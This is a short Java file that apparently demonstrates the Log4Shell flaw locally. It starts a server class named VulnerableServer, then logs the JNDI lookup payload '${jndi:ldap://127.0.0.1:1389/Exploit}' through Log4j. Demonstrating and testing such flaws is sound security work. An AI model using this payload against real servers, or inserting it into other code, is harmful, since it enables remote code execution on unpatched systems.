import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {

    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws InterruptedException {
        new Thread(() -> {
            try {
                VulnerableServer.startServer();
            } catch (Exception e) {
                logger.error("Error starting server: ", e);
            }
        }).start();

        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
